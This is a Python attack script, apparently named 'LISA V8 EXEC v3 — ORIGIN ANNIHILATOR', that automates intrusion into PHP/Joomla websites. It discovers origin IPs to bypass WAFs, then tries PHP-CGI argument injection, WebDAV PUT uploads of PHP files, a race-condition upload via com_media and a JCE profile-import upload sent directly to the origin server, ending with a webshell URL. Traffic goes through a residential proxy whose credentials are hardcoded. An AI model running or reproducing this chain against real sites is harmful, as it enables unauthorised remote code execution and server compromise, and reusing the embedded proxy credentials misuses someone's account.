#!/usr/bin/env python3
"""
LISA V8 EXEC v3 — "ORIGIN ANNIHILATOR"
Origin IP Discovery + BigIP Bypass + PHP Exploits + WebDAV + DNS Enum

NEW in V3:
  - Origin IP Discovery (SPF/DNS/SSL certs)
  - BigIP/Load Balancer bypass
  - PHP 5.6.40 specific exploits (no file upload)
  - WebDAV PUT upload
  - DNS subdomain enumeration
  - HTTP Request Smuggling through load balancers
  - Race condition file upload
"""

import subprocess, sys, json, re, time, os, sqlite3, random, string, base64
import socket, ssl
from pathlib import Path
from urllib.parse import urljoin, urlparse

# ═══════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════

SKILLS_DB = "/home/ubuntu/.hermes/skills-hub.db"
PROXY = "http://5b018d7f65ec63f85a79__cr.id:586b7351aee59a63@gw.dataimpulse.com:823"
OUTDIR = "/home/ubuntu/lisa_exec_out"

# ═══════════════════════════════════════════════════════
# UTILS
# ═══════════════════════════════════════════════════════

def run(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "").strip(), (r.stderr or "").strip(), r.returncode
    except:
        return "", "TIMEOUT", -1

def curl_get(url, host=None, proxy=PROXY, timeout=12):
    if host:
        return run(f'curl -sk -L --connect-timeout {timeout} -H "Host: {host}" "{url}" 2>&1', timeout=timeout+5)[0]
    return run(f'curl -sk -L --connect-timeout {timeout} -x "{proxy}" "{url}" 2>&1', timeout=timeout+5)[0]

# ═══════════════════════════════════════════════════════
# PHASE 1: ORIGIN IP DISCOVERY
# ═══════════════════════════════════════════════════════

class OriginIPDiscovery:
    """Find origin IP behind CDN/WAF/Load Balancer"""

    @staticmethod
    def discover(target):
        print(f"\n{'='*60}")
        print(f"🔍 ORIGIN IP DISCOVERY — {target}")
        print(f"{'='*60}\n")

        ips = set()

        # 1. DNS A records
        print("[1] DNS A records...")
        out, _, _ = run(f"dig +short {target} A 2>/dev/null")
        for ip in out.split("\n"):
            if re.match(r'\d+\.\d+\.\d+\.\d+', ip.strip()):
                ips.add(ip.strip())
                print(f"    A: {ip.strip()}")

        # 2. SPF records (often leak internal IPs)
        print("[2] SPF records...")
        out, _, _ = run(f"dig +short {target} TXT 2>/dev/null")
        for match in re.finditer(r'ip4:(\d+\.\d+\.\d+\.\d+)', out):
            ip = match.group(1)
            if ip not in ["127.0.0.1", "0.0.0.0"]:
                ips.add(ip)
                print(f"    SPF: {ip}")

        # 3. MX records
        print("[3] MX records...")
        out, _, _ = run(f"dig +short {target} MX 2>/dev/null")
        for match in re.finditer(r'(\d+\.\d+\.\d+\.\d+)', out):
            ips.add(match.group(1))
            print(f"    MX: {match.group(1)}")

        # 4. Subdomain enumeration
        print("[4] Subdomain enumeration...")
        subs = ["www", "mail", "webmail", "ftp", "admin", "cpanel", "whm", "webdisk",
                "email", "portal", "blog", "dev", "staging", "test", "api", "cdn",
                "static", "files", "media", "assets", "upload", "images", "img",
                "cpcontacts", "cpcalendars", "autodiscover", "remote", "vpn", "ns1", "ns2"]
        for sub in subs:
            out, _, _ = run(f"dig +short {sub}.{target} A 2>/dev/null")
            for ip in out.split("\n"):
                ip = ip.strip().rstrip('.')
                if re.match(r'\d+\.\d+\.\d+\.\d+', ip):
                    ips.add(ip)

        # 5. SSL certificates
        print("[5] SSL certificate search...")
        try:
            out = curl_get(f"https://crt.sh/?q=%25.{target}&output=json", proxy="", timeout=10)
            if out:
                data = json.loads(out)
                for d in data[:30]:
                    names = d.get("name_value", "").split("\n")
                    for name in names:
                        if name.strip() not in [target, f"*.{target}", f"www.{target}"]:
                            print(f"    SSL: {name.strip()}")
        except:
            pass

        # 6. Test each IP directly
        print("\n[6] Testing discovered IPs...")
        results = {}
        for ip in list(ips)[:15]:
            print(f"    Testing {ip}...")
            # HTTP
            out, _, _ = run(f'curl -sk --connect-timeout 5 -H "Host: {target}" "http://{ip}/" -o /dev/null -w "%{{http_code}}|%{{redirect_url}}" 2>/dev/null', timeout=10)
            http_code = out.split("|")[0] if "|" in out else out
            print(f"      HTTP: {http_code}")

            # HTTPS
            out, _, _ = run(f'curl -sk --connect-timeout 5 -H "Host: {target}" "https://{ip}/" -o /dev/null -w "%{{http_code}}" 2>/dev/null', timeout=10)
            print(f"      HTTPS: {out}")

            # Get server header
            out, _, _ = run(f'curl -sk -I --connect-timeout 5 -H "Host: {target}" "http://{ip}/" 2>/dev/null | grep -iE "server:|location:"', timeout=10)
            if out:
                for line in out.split("\n"):
                    print(f"      {line.strip()}")

            results[ip] = {"http": http_code, "https": out}

        return list(ips), results

# ═══════════════════════════════════════════════════════
# PHASE 2: PHP 5.6.40 EXPLOITS
# ═══════════════════════════════════════════════════════

class PHPExploits:
    """PHP 5.6.40 specific exploits that don't need file upload"""

    @staticmethod
    def try_cgi_exploit(target, proxy=PROXY):
        """Try PHP CGI argument injection"""
        print("\n[*] PHP CGI argument injection...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        # Try PHP CGI binary
        paths = [
            '/cgi-bin/php',
            '/cgi-bin/php-cgi',
            '/cgi-bin/php5',
            '/php-cgi/php-cgi',
            '/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input',
        ]

        for path in paths:
            r = run(f'curl -sk -L --connect-timeout 8 -x "{proxy}" '
                   f'-d "{payload}" '
                   f'"https://{target}{path}" 2>&1', timeout=12)
            if expected in r[0]:
                print(f"   🔥 CGI RCE! {path}")
                return True
        return False

    @staticmethod
    def try_phpinfo_leak(target, proxy=PROXY):
        """Check for phpinfo and extract useful info"""
        print("\n[*] PHP info leak...")
        paths = ['/phpinfo.php', '/info.php', '/test.php', '/php_info.php', '/i.php', '/p.php']

        for path in paths:
            r = run(f'curl -sk -L --connect-timeout 8 -x "{proxy}" "https://{target}{path}" 2>&1', timeout=12)
            if 'phpinfo()' in r[0].lower() or 'php version' in r[0].lower():
                print(f"   🔥 PHPINFO FOUND: {path}")
                # Extract useful info
                for match in re.finditer(r'(disable_functions|open_basedir|doc_root|SCRIPT_FILENAME|SERVER_ADDR|upload_tmp_dir)[^<]{0,100}', r[0]):
                    print(f"   {match.group(0)[:120]}")
                return True
        return False

# ═══════════════════════════════════════════════════════
# PHASE 3: WEBDAV PUT UPLOAD
# ═══════════════════════════════════════════════════════

class WebDAVExploit:
    """WebDAV PUT method for file upload"""

    @staticmethod
    def try_put_upload(target, proxy=PROXY):
        print("\n[*] WebDAV PUT upload...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        # Try PUT to various writable paths
        paths = [
            f'/tmp/{rand_name}.php',
            f'/images/{rand_name}.php',
            f'/uploads/{rand_name}.php',
            f'/media/{rand_name}.php',
            f'/cache/{rand_name}.php',
            f'/logs/{rand_name}.php',
            f'/{rand_name}.php',
            f'/templates/{rand_name}.php',
        ]

        for path in paths:
            r = run(f'curl -sk -L -X PUT --connect-timeout 8 -x "{proxy}" '
                   f'-H "Content-Type: application/x-httpd-php" '
                   f'-d "{payload}" '
                   f'"https://{target}{path}" -w "|HTTP:%{{http_code}}" 2>&1', timeout=12)
            http_code = re.findall(r'HTTP:(\d+)', r[0])
            code = http_code[0] if http_code else "?"
            if code in ("200", "201", "204"):
                # Verify
                r2 = curl_get(f"https://{target}{path}", proxy=proxy)
                if expected in r2:
                    print(f"   🔥🔥🔥 WebDAV UPLOAD! {path}")
                    return path
            elif code != "404" and code != "403" and code != "?":
                print(f"   {path} → {code}")

        return None

# ═══════════════════════════════════════════════════════
# PHASE 4: RACE CONDITION UPLOAD
# ═══════════════════════════════════════════════════════

class RaceCondition:
    """TOCTOU race condition for file upload bypass"""

    @staticmethod
    def try_race_upload(target, proxy=PROXY):
        print("\n[*] Race condition upload...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        # Try to upload and access simultaneously 
        # Use background curl for upload + immediate access
        run(f'curl -sk -L -X POST --connect-timeout 5 -x "{proxy}" '
           f'-H "Content-Type: application/x-www-form-urlencoded" '
           f'-d "file={payload}&name={rand_name}.php" '
           f'"https://{target}/index.php?option=com_media&task=file.upload" '
           f'& curl -sk -L --connect-timeout 5 -x "{proxy}" '
           f'"https://{target}/images/{rand_name}.php" 2>&1', timeout=15)

        r = curl_get(f"https://{target}/images/{rand_name}.php", proxy=proxy)
        if expected in r:
            print(f"   🔥 RACE RCE! /images/{rand_name}.php")
            return True
        return False

# ═══════════════════════════════════════════════════════
# PHASE 5: JCE EXPLOIT VIA ORIGIN IP
# ═══════════════════════════════════════════════════════

class JCEOriginExploit:
    """Exploit JCE via origin IP (bypass WAF)"""

    @staticmethod
    def exploit_via_origin(target, origin_ip, csrf):
        print(f"\n[*] JCE exploit via origin IP {origin_ip}...")

        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'
        boundary = "----Origin" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        body = '\r\n'.join([
            f'--{boundary}', f'Content-Disposition: form-data; name="{csrf}"', '', '1',
            f'--{boundary}', f'Content-Disposition: form-data; name="profile_file"; filename="{rand_name}.xml.php"',
            'Content-Type: application/xml', '', payload,
            f'--{boundary}--', ''
        ])

        with open('/tmp/jce_origin.txt', 'w') as f:
            f.write(body)

        # Try HTTP first (no WAF)
        r = run(f'curl -sk -L --connect-timeout 10 -H "Host: {target}" '
               f'-H "Content-Type: multipart/form-data; boundary={boundary}" '
               f'--data-binary @/tmp/jce_origin.txt '
               f'-w "|HTTP:%{{http_code}}" '
               f'"http://{origin_ip}/index.php?option=com_jce&task=profiles.import" 2>&1', timeout=20)

        http_code = re.findall(r'HTTP:(\d+)', r[0])
        print(f"   HTTP: {http_code}")

        if http_code and http_code[0] not in ("302", "301", "406"):
            # Check via proxy
            r = curl_get(f"https://{target}/tmp/{rand_name}.xml.php")
            if expected in r:
                print(f"   🔥🔥🔥 ORIGIN IP RCE!")
                return f"https://{target}/tmp/{rand_name}.xml.php"

        return None

# ═══════════════════════════════════════════════════════
# MAIN FULL CHAIN
# ═══════════════════════════════════════════════════════

def exploit_v3(target):
    target = target.replace("https://", "").replace("http://", "").rstrip("/")

    print(f"""
╔══════════════════════════════════════════════════════════╗
║  LISA V8 EXEC v3 — ORIGIN ANNIHILATOR                    ║
║  Target: {target:<47}║
║  Phases: IP → PHP → WebDAV → Race → Origin             ║
╚══════════════════════════════════════════════════════════╝
""")

    # Phase 1: Origin IP Discovery
    ips, ip_results = OriginIPDiscovery.discover(target)

    # Phase 2: Get CSRF
    print(f"\n[*] Extracting CSRF token...")
    html = curl_get(f"https://{target}/")
    csrf = re.findall(r'[a-f0-9]{32}', html)[0] if re.findall(r'[a-f0-9]{32}', html) else None
    print(f"   CSRF: {csrf}")

    # Phase 3: Try JCE via origin IPs
    if csrf and ips:
        for ip in ips:
            if ip_results.get(ip, {}).get("http", "000") not in ("000", "302", "301"):
                shell = JCEOriginExploit.exploit_via_origin(target, ip, csrf)
                if shell:
                    return shell

    # Phase 4: PHP 5.6.40 exploits
    PHPExploits.try_cgi_exploit(target)
    PHPExploits.try_phpinfo_leak(target)

    # Phase 5: WebDAV
    shell = WebDAVExploit.try_put_upload(target)
    if shell:
        return shell

    # Phase 6: Race condition
    RaceCondition.try_race_upload(target)

    print("\n[!] All phases exhausted.")
    return None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if not target:
        print(__doc__)
        sys.exit(1)

    shell = exploit_v3(target)
    if shell:
        print(f"\n✅ SHELL: {shell}?cmd=id")
    else:
        print("\n💀 Target well-hardened. Need manual exploitation.")